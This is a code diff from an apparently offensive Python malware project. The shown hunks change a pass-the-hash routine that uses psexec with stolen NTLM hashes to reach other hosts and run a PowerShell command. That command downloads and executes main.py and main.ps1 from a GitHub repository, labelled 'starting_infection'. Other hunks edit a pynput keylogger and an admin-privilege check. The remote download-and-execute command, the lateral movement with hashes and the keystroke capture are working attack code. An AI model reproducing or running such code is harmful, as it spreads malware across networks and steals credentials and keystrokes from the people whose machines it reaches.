@@ -25,7 +25,7 @@ from flask import request, Flask, send_from_directory
 
 # compile using: pyinstaller --onefile --paths=venv\Lib\site-packages ./main.py
 # set to True when compiling using pyinstaller, when developing keep False.
-IS_EXECUTABLE = True
+IS_EXECUTABLE = False
 
 # whether we're on windows
 IS_WINDOWS = any(platform.win32_ver())
@@ -276,7 +276,7 @@ def passthehash():
             # remote_cmd = r"""powershell.exe powershell.exe 'echo starting_infection...; (New-Object System.Net.WebClient).DownloadFile(''https://github.com/mahmoodsh36/test2/raw/main/main.py'' , ''C:\main.py''); python C:\main.py; echo exiting...; sleep 3' """
             # this is the command used to connect to the target and run 'remote_cmd'
             #connect_cmd = f"./{psexec} -hashes ':{passhash}' -port 445 mahmo@10.0.2.4 '{remote_cmd}'"
-            remote_cmd = r"""powershell.exe powershell.exe 'echo starting_infection...; (New-Object System.Net.WebClient).DownloadFile(''https://github.com/mahmoodsh36/test2/raw/main/main.py'' , ''C:\main.py''); python -m venv venv; venv\Scripts\pip.exe install tqdm psutil flask pynput requests rich paramiko; venv\Scripts\python.exe main.py; echo exiting...; sleep 3' """
+            remote_cmd = r"""powershell.exe powershell.exe 'echo starting_infection...; (New-Object System.Net.WebClient).DownloadFile(''https://github.com/mahmoodsh36/test2/raw/main/main.py'' , ''C:\main.py''); (New-Object System.Net.WebClient).DownloadFile(''https://github.com/mahmoodsh36/test2/raw/main/main.ps1'' , ''C:\main.ps1''); .\main.ps1; """
             connect_cmd = f"powershell.exe .\\{psexec} -hashes ':{passhash}' -port {port} '{username}@{ip}' \"{remote_cmd}\""
             my_print(f'attempting to connect to {username}@{ip}:{port} with hash {passhash}')
             my_print(f'running command: {connect_cmd}')
@@ -469,7 +469,7 @@ def start_keylogger():
             # pynput.keyboard.Key.<key here>.value may be useful too
             key_str = str(key)
             is_alphanumeric = False
-        print(f'added {key_str}.')
+        my_print(f'added {key_str}.')
         # append the captured key to the in-memory "cache"
         keyhist.add_key(key_str, is_alphanumeric)
 
@@ -488,7 +488,7 @@ def start_keylogger():
 if __name__ == '__main__':
     my_print(f"is admin: {is_admin()}")
     if not is_admin():
-        print("please run this script as admin(windows)/root(unix)")
+        my_print("please run this script as admin(windows)/root(unix)")
         exit(1)
     # first argument should either be
     # - none: this means the program is invoked for the first time, we need to make sure we've "installed"
